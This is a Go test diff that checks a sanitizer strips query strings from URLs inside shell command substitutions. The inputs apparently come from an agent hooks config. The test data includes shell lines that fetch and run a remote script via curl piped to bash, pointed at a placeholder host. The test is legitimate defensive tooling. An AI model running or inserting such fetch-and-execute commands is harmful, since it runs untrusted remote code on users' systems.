@@ -777,3 +777,19 @@ func TestFoldedObjectsSkipCaseVariantWarnings(t *testing.T) {
 		t.Fatalf("yaml warnings = %v err %v", warnings, err)
 	}
 }
+
+// TestSanitizeURLStopsAtSubstitution checks that a URL ends at a
+// backtick or ")", so the command substitution around it still closes
+// after its query is stripped.
+func TestSanitizeURLStopsAtSubstitution(t *testing.T) {
+	src := source(model.ScopeRepo, ".codex/hooks.json")
+	for in, want := range map[string]string{
+		"echo `curl https://e.example.invalid/x?sig=abc`":                                "echo `curl https://e.example.invalid/x`",
+		`bash -c "$(curl -fsSL https://e.example.invalid/i.sh)"`:                         `bash -c "$(curl -fsSL https://e.example.invalid/i.sh)"`,
+		"x=$(curl https://e.example.invalid/?k=v) && `curl https://e.example.invalid/y`": "x=$(curl https://e.example.invalid/) && `curl https://e.example.invalid/y`",
+	} {
+		if got := src.SafeString(in); got != want {
+			t.Errorf("SafeString(%q) = %q, want %q", in, got, want)
+		}
+	}
+}
